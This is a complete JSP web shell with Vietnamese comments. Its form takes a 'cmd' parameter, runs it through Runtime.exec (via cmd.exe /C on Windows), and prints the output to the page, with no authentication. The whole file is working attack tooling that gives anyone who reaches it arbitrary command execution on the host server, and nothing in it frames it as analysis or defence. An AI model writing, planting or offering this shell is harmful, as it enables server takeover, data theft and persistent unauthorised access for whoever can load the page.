<%@ page import="java.util.*,java.io.*"%>
<%-- Xử lý luồng I/O (InputStream, OutputStream, DataInputStream)
    Dùng trong quá trình gọi Runtime.exec() và đọc output
 --%>
<%
%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    // In lại lệnh đã gửi
    Process p;
    // Nếu đang chạy trên Windows thì dùng cmd.exe /C lệnh
    // Nếu đang trên Linux/macOS thì gọi trực tiếp lệnh hệ thống
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    }
    
    else{
        // Thực thi lệnh hệ thống
        p = Runtime.getRuntime().exec(request.getParameter("cmd")); 	
    }
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
    }
}
%>
</pre>
</BODY></HTML>